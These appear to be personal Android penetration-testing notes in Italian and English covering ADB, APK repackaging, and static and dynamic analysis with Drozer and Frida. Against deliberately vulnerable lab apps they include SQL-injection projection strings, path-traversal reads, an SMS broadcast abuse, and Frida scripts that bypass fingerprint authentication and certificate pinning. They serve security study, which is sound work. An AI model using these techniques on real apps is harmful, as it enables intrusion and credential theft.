

https://book.hacktricks.xyz/mobile-pentesting/android-checklist
https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting



```
###. Android Applications Basics:

Condivisione UID:
Applicazioni nel manifest devono avere lo stesso android:sharedUserId


Ambiente sicuro utilizzando Sandboxing per ciascuna applicazione.
Ad ogni applicazione viene applicato SELinux, che nega l'interazione tra processi non previste.


APK Contents (Not exhaustive)
- AndroidManifest.xml
- resources.arsc/strings.xml
- resources.arsc: contains precompiled resources, like binary XML.
	res/xml/files_paths.xml
- META-INF/This is where the Certificate is located!
- classes.dex: Contains Dalvik bytecode, representing the compiled Java (or Kotlin) code that the application executes by default.
- lib/
	Houses native libraries, segregated by CPU architecture in subdirectories.
	- armeabi: code for ARM based processors
	- armeabi-v7a: code for ARMv7 and higher based processors
	- x86: code for X86 processors
	- mips: code for MIPS processors only
- assets/
	- Stores miscellaneous files needed by the app, potentially including additional native libraries or DEX files, sometimes used by malware authors to conceal additional code.
- res/
Contains resources that are not compiled into resources.arsc


```



### Learn Android Fundamentals
```
###. ADB


Windows:
C:\Users\<username>\AppData\Local\Android\sdk\platform-tools\adb.exe

> adb devices
> adb -s "emulator" shell
> adb connect <IP>:<PORT>
> adb install -s test.apk   #install application on sdcard
> adb push test.apk /storage/emulated/0/Download
> adb push test.apk /sdcard
> adb uninstall <com.test.app>
> adb shell pm list packages <FILTER-STR>



Print the path to the APK:
> adb shell pm path <com.android.phone>
> adb shell pm clear <com.android.phone>


Taking a screenshot of a device display:
> adb shell screencap /sdcard/screen.png


ADB - Enable Debugging:
> adb shell am setup-debug-app –w <package_name>.
Note: This command must be run each time before starting the application to ensure it waits for the debugger.

For persistence, use:
> adb shell am setup-debug-app –w -–persistent <package_name>.

To remove all flags, use
> adb shell am clear-debug-app <package_name>.


PM - Command:
#List installed packages:
> pm list packages 

#Get the path to the apk file of tha package
> pm path <package name> 

#Start an activity. Whiout options you can see the help menu
> am start [<options>]

#Start a service. Whiout options you can see the help menu:
> am startservice [<options>] 

#Send a broadcast. Whiout options you can see the help menu:
am broadcast [<options>]

#Send keystrokes to device:
input [text|keyevent] 


ADB - Processes:
> adb shell pidof com.your.application [PID]
> adb shell ps [PID]




ADB - Logcat:
> adb logcat | grep 4526 (pid)
> adb logcat | findstr 4526 (pid)



> adb logcat *:V   #Lowest priority, filter to only show Verbose level
> adb logcat *:W   #Filter to only show Warning level
> adb logcat *:E   #Filter to only show Error level
> adb logcat *:F   #Filter to only show Fatal level
> adb logcat *:S   #Silent, highest priority, on which nothing is ever printed

> adb logcat *:E -f /data/local/tmp/log.txt
> adb logcat -c    #Clear Log

> adb backup [-apk] [-shared] [-system] [-all] -f file.backup
> adb backup -f myapp_backup.ab -apk com.myapp

```

```
###. Smali

#. Fast Way:
Visual Studio Code + APKLab extensions u can automaticallyu decompile, modify, recompile, sign & install the application without executing any command.
Change Smali Code:
Using VS Code, install smalise extension with debugging editor enabled
After u must compile and sign APK

- Other Scripts: 
https://github.com/ax/apk.sh


#. Manual - Decompiling:
> apktool d APP.apk  (if error try with -r and dont decode resources - update lastest version)
[res/values/strings.xml]
[AndroidManifest.xml]
[.sqlite or .db]

# or
> apktool d -f -r APP.apk
> apktool b -f -r base/dist/APP.apk

#. Sign APK - KeyGen
keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias <your-alias>
Finally, sign the new APK:

#. Sign APK - Sign
jarsigner -keystore key.jks path/to/dist/* <your-alias>


#. Sign APK - ZipAlign
zipalign is an archive alignment tool that provides important optimisation to Android application (APK) files. More information here.

> zipalign [-f] [-v] <alignment> infile.apk outfile.apk
> zipalign -v 4 infile.apk


#. Sign APK - APKSigner:
If you prefer to use apksigner instead of jarsigner, you should sing the apk after applying the optimization with zipaling. BUT NOTICE THAT YOU ONLY HAVE TO SIGN THE APPLCIATION ONCE WITH jarsigner (before zipalign) OR WITH aspsigner (after zipaling).

> apksigner sign --ks key.jks ./dist/mycompiled.apk


#. Recompile the APK:
> apktool b . #In the folder generated when you decompiled the application


#. Sign the new APK:
La firma delle APK (Android Package) con una chiave è un passaggio cruciale per garantire l'integrità e la sicurezza delle applicazioni Android. Ecco alcuni motivi per cui è necessario firmare le APK con una chiave:

1. Verifica dell'autenticità: La firma con una chiave privata garantisce che l'APK provenga da una fonte attendibile. Quando un utente installa o aggiorna un'app, il sistema Android verifica la firma dell'APK utilizzando il certificato pubblico associato alla chiave privata. Se la firma corrisponde, l'aggiornamento viene accettato.

2. Prevenzione di modifiche non autorizzate: La firma impedisce modifiche non autorizzate all'APK. Se qualcuno tenta di alterare il codice o i contenuti dell'APK, la firma non corrisponderà e l'installazione verrà bloccata.

3. Gestione delle versioni: Per consentire l'aggiornamento di un'app, deve essere firmata con la stessa chiave utilizzata per la versione precedente. Questo garantisce che gli utenti ricevano solo aggiornamenti da fonti attendibili.

4. Distribuzione su Google Play: Per pubblicare un'app su Google Play, è obbligatorio firmarla con una chiave. Google Play gestisce automaticamente la chiave di firma dell'app e la utilizza per firmare gli APK di distribuzione ottimizzati generati dagli app bundle. Questo processo migliora la sicurezza e semplifica la gestione delle chiavi.



Then, you need to generate a key:
> keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias <your-alias>

Sign the APK:
> jarsigner -keystore key.jks path/to/dist/* <your-alias>


#. Optimize new application:
Zipalign is an archive alignment tool that provides important optimisation to Android application (APK) files.
> zipalign [-f] [-v] <alignment> infile.apk outfile.apk
> zipalign -v 4 infile.apk

Estract APK from device:
> adb shell pm list packages
> adb shell pm path com.android.insecurebankv2
> adb pull /data/app/com.android.insecurebankv2- Jnf8pNgwy3QA_U5f-n_4jQ==/base.apk

Utils - Download APK Download:
Or APK Extractor from APP

https://apkcombo.com/es-es/apk-downloader/
https://apps.evozi.com/apk-downloader/
https://apkpure.com/es
https://www.apkmirror.com

```


```
###. Static Analysis:

# Tools:
# Mobsf:
> docker pull opensecurity/mobile-security-framework-mobsf:latest
> docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest 


# Drozer:



> Semgrep:


> Qark

# APKleaks:
> apkleaks -f name.apk -o output.txt


# Mariana Trench:
> 


# Ostorlab:
> Upload APK from file.apk or Store

# Static Analysis Code:
> 



#. APK Decompilers
- JD-GUI
- JADX:
To specify an output directory or adjust decompilation options: jadx app.apk -d <path to output dir> --no-res --no-src --no-imports
- ByteCode-Viewer


#. Tools - Leak Info:
Apkurlgrep:
Search for api keys, encryption, bluetooth uuids, tokens

Firebase - Bad Configuration:

###. Common Vulnerabilities:

#. Debuggable Applications:
le applicazioni impostate come debuggabili ( `debuggable="true"`) nel file _Manifest.xml_ rappresentano un rischio poiché consentono connessioni che possono portare allo sfruttamento. Per ulteriori informazioni su come sfruttare le applicazioni di cui è possibile eseguire il debug, fare riferimento a un tutorial su come trovare e sfruttare le applicazioni di cui è possibile eseguire il debug su un dispositivo.



#. Backup Configuration:
l' `android:allowBackup="false"`attributo deve essere impostato esplicitamente per le applicazioni che trattano informazioni sensibili per impedire backup di dati non autorizzati tramite adb, in particolare quando è abilitato il debug USB


#. Security Netowrk
le configurazioni di sicurezza di rete personalizzate ( android:networkSecurityConfig="@xml/network_security_config") in res/xml/ possono specificare dettagli di sicurezza come pin del certificato e impostazioni del traffico HTTP. Un esempio è consentire il traffico HTTP per domini specifici.


#. Activity - Service Exported:
identificare le attività e i servizi esportati nel manifest può evidenziare componenti che potrebbero essere utilizzati in modo improprio. Ulteriori analisi durante i test dinamici possono rivelare come sfruttare questi componenti.


#. Content Provider - File:
i fornitori di contenuti esposti potrebbero consentire l'accesso non autorizzato o la modifica dei dati. Anche la configurazione di FileProviders dovrebbe essere esaminata attentamente.


#. Broadcast Sender / Receiver
questi componenti potrebbero essere sfruttati per lo sfruttamento, con particolare attenzione al modo in cui gli schemi URL vengono gestiti per le vulnerabilità di input.


#. Version SDK:
gli attributi minSdkVersion, targetSDKVersione maxSdkVersionindicano le versioni Android supportate, evidenziando l'importanza di non supportare versioni Android obsolete e vulnerabili per motivi di sicurezza.


#. TapJacking:
Il tapjacking è un attacco in cui un'applicazione dannosa viene  lanciata e si posiziona sopra un'applicazione vittima . Una volta oscurata visibilmente l'app vittima, la sua interfaccia utente è progettata in modo tale da indurre l'utente a interagire con essa, mentre trasmette l'interazione all'app vittima. In effetti, impedisce all'utente di sapere che sta effettivamente eseguendo azioni sull'app vittima.

Per rilevare le app vulnerabili a questo attacco dovresti cercare le attività esportate nel manifest di Android (nota che un'attività con un filtro intent viene automaticamente esportata per impostazione predefinita). Una volta trovate le attività esportate, controlla se richiedono qualche autorizzazione . Questo perché anche l'applicazione dannosa avrà bisogno di tale autorizzazione .


Se sul button `android:filterTouchesWhenObscured`è impostato su `true, `View`non riceverà tocchi ogni volta che la finestra della vista è oscurata da un'altra finestra visibile. Se impostato su `true`, ad esempio, un pulsante può essere automaticamente disabilitato se è oscurato.

<Button android:text="Button"
android:id="@+id/button1"
android:layout_width="wrap_content"
android:layout_height="wrap_content" 
android:filterTouchesWhenObscured="true">
</Button>

https://github.com/carlospolop/Tapjacking-ExportedActivity

Puoi utilizzare qark con i parametri --exploit-apk--sdk-path /Users/username/Library/Android/sdkper creare un'applicazione dannosa per verificare possibili vulnerabilità di Tapjacking .\






#. Task Hijacking
In Android, un'attività è essenzialmente un insieme di attività con cui gli utenti interagiscono per completare un lavoro specifico, organizzato all'interno di uno stack . Questo stack ordina le attività in base a quando sono state aperte, con l'attività più recente visualizzata in alto come attività in primo piano . In qualsiasi momento, solo questa attività è visibile sullo schermo, rendendola parte dell'attività in primo piano .

Ecco una rapida ripartizione delle transizioni delle attività:

1. L'attività 1 inizia come unica attività in primo piano.

2. L'avvio dell'attività 2 spinge l'attività 1 nello stack posteriore, portando l'attività 2 in primo piano.

3. Iniziare l'Attività 3 sposta l'Attività 1 e l'Attività 2 più indietro nella pila, con l'Attività 3 ora in primo piano.

4. La chiusura dell'attività 3 riporta l'attività 2 in primo piano, mostrando il meccanismo semplificato di navigazione delle attività di Android.



Modalità di avvio
L' launchMode attributo dirige la gestione delle istanze di attività all'interno delle attività. La modalità singleTask è fondamentale per questo attacco, dettando tre scenari basati sulle istanze di attività esistenti e sulle corrispondenze di affinità delle attività. L'exploit dipende dalla capacità dell'app dell'aggressore di imitare l'affinità delle attività dell'app bersaglio, inducendo con l'inganno il sistema Android a lanciare l'app dell'aggressore invece del bersaglio previsto.


#. Passaggi di attacco dettagliati
- Installazione di app dannose : la vittima installa l'app dell'aggressore sul proprio dispositivo.

- Attivazione iniziale : la vittima apre innanzitutto l'app dannosa, configurando il dispositivo per l'attacco.

- Tentativo di avvio dell'app di destinazione : la vittima tenta di aprire l'app di destinazione.

- Esecuzione del dirottamento : a causa dell'affinità delle attività corrispondenti, l'app dannosa viene avviata al posto dell'app di destinazione.

- Inganno : l'app dannosa presenta una schermata di accesso falsa simile all'app di destinazione, inducendo l'utente a inserire informazioni sensibili.


https://github.com/az0mb13/Task_Hijacking_Strandhogg

Per prevenire tali attacchi, gli sviluppatori possono impostare taskAffinity una stringa vuota e optare per la singleInstance launchMode, garantendo l'isolamento della propria app dagli altri. La personalizzazione della onBackPressed()funzione offre una protezione aggiuntiva contro il dirottamento delle attività.




#. Archiviazione dei dati non sicura.
In Android, i file archiviati nella memoria interna sono progettati per essere accessibili esclusivamente dall'app che li ha creati . Questa misura di sicurezza viene applicata dal sistema operativo Android ed è generalmente adeguata alle esigenze di sicurezza della maggior parte delle applicazioni. Tuttavia, gli sviluppatori a volte utilizzano modalità come MODE_WORLD_READABLE e MODE_WORLD_WRITABLEper consentire la condivisione dei file tra diverse applicazioni. Tuttavia, queste modalità non limitano l'accesso a questi file da parte di altre applicazioni, comprese quelle potenzialmente dannose.

- Analisi statica:
Assicurarsi che l'uso di MODE_WORLD_READABLEe MODE_WORLD_WRITABLEsia attentamente esaminato . Queste modalità possono potenzialmente esporre i file ad accessi involontari o non autorizzati .

- Analisi dinamica:
Verifica le autorizzazioni impostate sui file creati dall'app. In particolare, controlla se alcuni file sono impostati per essere leggibili o scrivibili in tutto il mondo . Ciò può rappresentare un rischio significativo per la sicurezza, poiché consentirebbe a qualsiasi applicazione installata sul dispositivo, indipendentemente dalla sua origine o intenzione, di leggere o modificare questi file.





#. Data Sensitive Storage in text without cryptography

- SharedPrefs: 
Android consente a ciascuna applicazione di salvare facilmente file xml nel percorso /data/data/<packagename>/shared_prefs/e talvolta è possibile trovare informazioni sensibili in testo non crittografato in quella cartella.

- Database: 
Android consente a ciascuna applicazione di salvare facilmente i database SQLite nel percorso /data/data/<packagename>/databases/e talvolta è possibile trovare informazioni sensibili in testo non crittografato in quella cartella.




#. Broken TLS:
Per qualche motivo a volte gli sviluppatori accettano tutti i certificati anche se ad esempio il nome host non corrisponde a righe di codice come quella seguente:

SSLSocketFactory sf = new cc(trustStore);
sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);



#. Broken Cryptography:
Alcuni sviluppatori salvano i dati sensibili nella memoria locale e li crittografano con una chiave codificata/prevedibile nel codice. Ciò non dovrebbe essere fatto poiché alcune inversioni potrebbero consentire agli aggressori di estrarre informazioni riservate.

Utilizzo di algoritmi non sicuri e/o deprecati

Gli sviluppatori non devono utilizzare algoritmi deprecati per eseguire controlli di autorizzazione , archiviare o inviare dati. Alcuni di questi algoritmi sono: RC4, MD4, MD5, SHA1... Se gli hash vengono utilizzati per archiviare le password, ad esempio, gli hash resistenti alla forza bruta dovrebbero essere utilizzati con salt.





#. Altri controlli:
- Offuscare l'APK
- Verificare se il cell è rootato
- Verificare se viene utilizzato un emulatore
- Verificare la propria integrità usando pinning
- Utilizza APKid per verificare quale compilatore/offuscatore è stato utilizzato per creare l'APK

gives you information about how an APK was made. It identifies many compilers, packers, obfuscators, and other weird stuff




# React Native:
Per verificare se l'applicazione è stata creata sul framework React Native, attenersi alla seguente procedura:

Rinomina il file APK con estensione zip ed estrailo in una nuova cartella utilizzando il comando cp com.example.apk example-apk.zipe unzip -qq example-apk.zip -d ReactNative.

Passare alla cartella ReactNative appena creata e individuare la cartella delle risorse. All'interno di questa cartella dovresti trovare il file index.android.bundle, che contiene React JavaScript in un formato ridotto.

Utilizza il comando find . -print | grep -i ".bundle$"per cercare il file JavaScript.

Per analizzare ulteriormente il codice JavaScript, crea un file denominato index.htmlnella stessa directory con il seguente codice:


<script src="./index.android.bundle"></script>
Puoi caricare il file su https://spaceraccoon.github.io/webpack-exploder/ o seguire questi passaggi:

Apri il index.htmlfile in Google Chrome.

Apri la barra degli strumenti per sviluppatori premendo Comando+Opzione+J per OS X o Control+Maiusc+J per Windows .

Fai clic su "Sorgenti" nella barra degli strumenti per sviluppatori. Dovresti vedere un file JavaScript suddiviso in cartelle e file, che costituiscono il pacchetto principale.

Se trovi un file chiamato index.android.bundle.map, sarai in grado di analizzare il codice sorgente in un formato non minimizzato. I file di mappa contengono la mappatura dell'origine, che consente di mappare identificatori minimizzati.

Per cercare credenziali ed endpoint sensibili, attenersi alla seguente procedura:

Identificare le parole chiave sensibili per analizzare il codice JavaScript. Le applicazioni React Native utilizzano spesso servizi di terze parti come Firebase, endpoint del servizio AWS S3, chiavi private, ecc.

In questo caso specifico, è stato osservato che l'applicazione utilizzava il servizio Dialogflow. Cerca un modello relativo alla sua configurazione.

È stata una fortuna che durante il processo di ricognizione siano state trovate credenziali hardcoded sensibili nel codice JavaScript.








#. Bypassing Biometric Authentication:
Collegandosi ai metodi onAuthenticationSucceeded, onAuthenticationFailed, o onAuthenticationErrordi BiometricPrompt.AuthenticationCallback, è possibile controllare l'esito del processo di autenticazione dell'impronta digitale.


#. Metodo 1 – Bypass senza utilizzo di oggetti crittografici
L'attenzione qui è sul callback onAuthenticationSucceeded , che è cruciale nel processo di autenticazione. I ricercatori di WithSecure hanno sviluppato uno script Frida , consentendo il bypass del NULL CryptoObject in onAuthenticationSucceeded(...) . Lo script impone un bypass automatico dell'autenticazione tramite impronta digitale all'invocazione del metodo. Di seguito è riportato uno snippet semplificato che mostra il bypass in un contesto Android Fingerprint


frida -U -f com.generic.insecurebankingfingerprint --no-pause -l fingerprint-bypass.js



#. Metodo 2 - Approccio alla gestione delle eccezioni:
Un altro script Frida di WithSecure risolve il problema dell'utilizzo non sicuro di oggetti crittografici. Lo script invoca onAuthenticationSucceeded con un CryptoObject che non è stato autorizzato da un'impronta digitale. Se l'applicazione tenta di utilizzare un oggetto di crittografia diverso, attiverà un'eccezione. Lo script si prepara a richiamare onAuthenticationSucceeded e a gestire javax.crypto.IllegalBlockSizeException nella classe Cipher , garantendo che gli oggetti successivi utilizzati dall'applicazione vengano crittografati con la nuova chiave.

frida -U -f com.generic.insecurebankingfingerprint --no-pause -l fingerprint-bypass-via-exception-handling.js


#. Metodo 3 - Strumentazione Strumentazione:
I framework di strumentazione come Xposed o Frida possono essere utilizzati per collegarsi ai metodi dell'applicazione in fase di runtime. Per l'autenticazione delle impronte digitali, questi framework possono:
Simulazione delle richiamate di autenticazione - Bypass SSL Pinning
frida -U -l script-to-bypass-authentication.js --no-pause -f com.generic.in


#. Metodo 4 - Reverse Engineering:
- Decompilazione APK
- Analisi del codice
- Ricompilazione APK


#. Metodo 5 - Strumenti autenticazione personalizati:
- Modulo MAGISK per roottare il dispositivo e modificare informazioni a livello hardware, comprese impronte digitali
- Script personalizzati


###. Altre funzioni utili interessanti:
- Esecuzione del codice :Runtime.exec(), ProcessBuilder(), native code:system()
- Invia SMS :sendTextMessage, sendMultipartTestMessage
- Funzioni native dichiarate come native:public native, System.loadLibrary, System.load




```



```
###. Dynamic Analysis:


#. Appetize.io
Tools utilizzato per caricare ed eseguire un APK e leggere i log dell'appliazione sul web e connetterti tramite ADB (ADB + Drozer - ADB + Frida)

#. Android Studio:
Utilizzare direttamente Android Studio

#. Genymotion o Nox



#. Monitoring Application:
Pidcat + ADB Logcat per visualizzare i log applicativi


#. DB SQLite:
Verificare presenza di database SQLite interni per salvare informazioni.
/data/data/the.package.name/databases




# Drozer:
Drozer ti consente di assumere il ruolo di un'app Android e interagire con altre app. Può fare tutto ciò che può fare un'applicazione installata , come utilizzare il meccanismo IPC (Inter-Process Communication) di Android e interagire con il sistema operativo sottostante. . Drozer è uno strumento utile per sfruttare attività esportate, servizi esportati e fornitori di contenuti come imparerai nelle sezioni seguenti.



#. Activity Exported:
Quando un'attività viene esportata, puoi richiamare il suo schermo da un'app esterna. Pertanto, se viene esportata un'attività con informazioni sensibili , potresti bypassare i meccanismi di autenticazione per accedervi.

Avviare activity exported from adb:
> adb shell am start -n com.example.package/com.example.test.MainActivity

Le attività possono anche restituire risultati . Se riesci a trovare un'attività esportata e non protetta che chiama il setResult metodo e restituisce informazioni sensibili , si verifica una perdita di informazioni sensibili.

#. TapJacking - Activity:
Se il tapjacking non viene impedito, potresti abusare dell'attività esportata per indurre l' utente a eseguire azioni inaspettate.





###. Content Provider:
Testing SQLInjection e Path Traversal sui Content Provider.




#. Service Exported
Ricorda che le azioni di un Service iniziano nel metodo onStartCommand.
Inside the code check for the handleMessage function which will receive the message:

Interaction with Services - Drozer:
<service android:name=".AuthService" android:exported="true" android:process=":remote"/>



###. Drozer


# List Packages:
dz> run app.package.list -f app.package
[com.app.package]

# Basic Information of the package:
dz> run app.package.info -a com.app.package


# Attack Surface of the package:
dz> run app.package.attacksurface com.app.package
[ Attack Surface:
 3 activities exported
 0 broadcast receivers exported
 2 content providers exported
 2 services exported
 is debuggable ]

Activity? Maybe u can start an activity and bypass authorization
Content Providers? Maybe u can access private data or exploit some vulnerabilities
Service?
Is Debuggable?



#. Drozer - Activity
<activity android:name="com.my.app.Initial" android:exported="true">
</activity>

dz> run app.activity.info -a com.mwr.example.sieve
[ Package: com.mwr.example.sieve
 com.mwr.example.sieve.FileSelectActivity
 com.mwr.example.sieve.MainLoginActivity
 com.mwr.example.sieve.PWList ]

#Start Activity
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
#or from ADB:
adb shell am start -n com.example.demo/com.example.test.MainActivity
adb am start -n #app package/component
-a android.intent.action.MAIN #Action details
-c android.intent.category.LAUNCHER #Category





#. Drozer - Service:
<service android:name=".AuthService" android:exported="true" android:process=":remote"/>
Inside the code check for the **handleMessage**function which will receive the message:

app.service.info            Info Service
app.service.send            Send a Message to a service, and display the reply  
app.service.start           Start Service                                       
app.service.stop            Stop Service


Drozer - List Service Info:
dz> run app.service.info -a com.mwr.example.sieve 
Package: com.mwr.example.sieve
  com.mwr.example.sieve.AuthService
    Permission: null
  com.mwr.example.sieve.CryptoService
    Permission: null




Drozer - Send Message to Service:
Nota che invierai prima i dati all'interno di " msg.what ", poi " msg.arg1 " e " msg.arg2 ", dovresti controllare all'interno del codice quali informazioni vengono utilizzate e dove. Usando l' --extraopzione puoi inviare qualcosa interpretato da " msg.replyTo" e usando --bundle-as-objpuoi creare e obiettare con i dettagli forniti.

Nell'esempio seguente:
what == 2354
arg1 == 9234
arg2 == 1
replyTo == object(string com.mwr.example.sieve.PIN 1337)


run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN 1337 --bundle-as-obj





###. Drozer - Broadcast Receiver:
Dopo aver scoperto questi ricevitori di trasmissione dovresti controllarne il codice . Presta particolare attenzione alla onReceive funzione poiché gestirà i messaggi ricevuti.


#. Drozer - List Broadcast Receiver:
app.broadcast.info          Get information about broadcast receivers           
app.broadcast.send          Send broadcast using an intent                      
app.broadcast.sniff         Register a broadcast receiver that can sniff particular intents

Es. 
dz> run app.broadcast.info -a my.app.package


Es. Utilizzo un BroadcastReceivers per inviare un SMS a qualsiasi destinazione senza chiedere il permesso all'utente.
https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk

Ho il mio Receivers Send SMS Now Receiver, che è in ascolto da azioni provenienti da "SOCIAL_SMS", leggo il codice del Receiver ed il metodo onReceive ed invio l'action.

<receiver android:label"Send SMS" android:name=".broadcastreceivers.SendSMSNowReceiver">
<intent-filter>
<action android:name= org.owasp.goatdroid.fourgats.SOCIAL_SMS" />
</intent-filter>
</receiver>

run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!"

ADB Manual - Broadcast Receivers - 
adb shell am start -a android.intent.action.VIEW -d "scheme://hostname/path?param=value" [your.package.name]




## Drozer - Content Providers:
I dati vengono forniti da un'applicazione ad altre su richiesta da un componente noto come Content Providers . Queste richieste vengono gestite tramite i metodi della classe ContentResolver. I ContentProviders possono archiviare i propri dati in varie posizioni, ad esempio un database, file o su una rete .

Nel file Manifest.xml è richiesta la dichiarazione del fornitore di contenuti. Ad esempio:

<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
    <path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>

Fondamentale sono authorities (gestore della logica) e path (path risorsa).
Per accedere è necessaria l'autorizzazione content://com.mwr.example.sieve.DBContentProvider/Keys. 
READ_KEYS è interessante notare che il percorso /Keys/ è accessibile nella sezione successiva, che non è protetta a causa di un errore dello sviluppatore, che ha protetto /Keys ma dichiarato /Keys/.

Drozer - Content Provider:
dz> run app.provider.info -a com.mwr.example.sieve 
  Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.DBContentProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
  Path Permissions:
  Path: /Keys
  Type: PATTERN_LITERAL
  Read Permission: com.mwr.example.sieve.READ_KEYS
  Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.FileBackupProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False


Drozer - Random Try Several URIs:
dz> run scanner.provider.finduris -a com.mwr.example.sieve 
[ Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
... 
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys 
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/ ]

U can alse check for ContentProvider code:
> URI.parse
> "content://"
> addUri
> sUriMatcher
> Quando controlli il codice del fornitore di contenuti, cerca anche funzioni denominate come: query, insert, update, delete:


dz> run app.provider.insert
dz> run app.provider.query
dz> run app.provider.update
dz> run app.provider.delete

Drozer - Query Content Provider:
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
[  _id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com ]

dz> run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Keys/ --string pin 1337 --string Password passw0rd1

Nota che in insert e update puoi usare --string per indicare una stringa, --double per indicare un double, --float, --integer, --long, --short, --boolean

Drozer - Content Provider - SQLInjection:
È semplice testare l'SQL injection (SQLite) manipolando i campi di proiezione e selezione passati al fornitore di contenuti. Quando si interroga il fornitore di contenuti ci sono 2 argomenti interessanti per cercare informazioni: --selection e --projection.
L'insieme di colonne restituito dalla query è chiamato "projection"


dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" 
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--" 
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... | 
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |



#. Drozer - Automatica Scan SQLI:
dz> run scanner.provider.injection -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve... 
Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
  
dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
  android_metadata
  notes
  sqlite_sequence


#. Drozer - Path Traversal:
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 
127.0.0.1            localhost

#. Drozer - Automatic Path Traversal:
dz> run scanner.provider.traversal -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve... 
Vulnerable Providers:
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.FileBackupProvider



#. Debugging - APK
E' possibile debuggare l'APK se attivato il flag, e collegare un debugger Java all'applicazione in esecuzione.
Solitamente il flag, è settato nel manifest:
<application theme="@2131296387" debuggable="true"


##. Drozer:
run app.package.debuggable   # Check App Debuggable

Tutorial:
https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/exploiting-a-debuggeable-applciation

https://resources.infosecinstitute.com/android-penetration-tools-walkthrough-series-drozer/#gref

https://github.com/mgcfish/mobiletools/blob/master/_posts/2016-08-01-Using-Drozer-for-application-security-assessments.md

https://www.hackingarticles.in/android-penetration-testing-drozer/

https://medium.com/@ashrafrizvi3006/how-to-test-android-application-security-using-drozer-edc002c5dcac



###. Frida:




###. Hooking Function:
https://www.infosec-blog.com/frida/Frida-hooking-android-part-1/
https://www.infosec-blog.com/frida/Frida-hooking-android-part-2/
https://www.infosec-blog.com/frida/Frida-hooking-android-part-3/
https://www.infosec-blog.com/frida/Frida-hooking-android-part-4/
https://www.infosec-blog.com/frida/Frida-hooking-android-part-5/

Conosciamo già il nome della funzione fun della classe che la contiene main_activity.
class.
method: "fun"
class: "main_activity" (com.example.a11x256.frida_test.my_activity)


console.log("Script loaded successfully ");
Java.perform(function x(){ //Silently fails without the sleep from the python code
    console.log("Inside java perform function");
    //get a wrapper for our class
    var my_class = Java.use("com.example.a11x256.frida_test.my_activity");
    //replace the original implmenetation of the function `fun` with our custom function
    my_class.fun.implementation = function(x,y){
    //print the original arguments
    console.log( "original call: fun("+ x + ", " + y + ")");
    //call the original implementation of `fun` with args (2,5)
    var ret_value = this.fun(2,5);
    return ret_value;
    }});



setTimeout(function() {
	console.log("[*] Starting script");
	Java.perform(function() {
		let reportWeirdUCS4 = Java.use("o.reportWeirdUCS4");
		reportWeirdUCS4["equals"].implementation = function (obj) {
		    console.log("[reportWeirdUCS4.equals] bypassing cert pinning");
		    return true;
		};
		console.log("[*] Ending script");
},0);



###. Dump Memory - Fridump:
Controlla se l'applicazione sta memorizzando informazioni sensibili nella memoria che non dovrebbe archiviare come password.

Usando Fridump3 puoi scaricare la memoria dell'app con:
https://github.com/rootbsd/fridump3


# With PID
python3 fridump3.py -u <PID> 

# With name
frida-ps -Uai
python3 fridump3.py -u "<Name>"
Questo scaricherà la memoria nella cartella ./dump e lì potresti usare qualcosa del tipo:

> strings * | grep -E "^[a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+$"








Javascript Disabled:
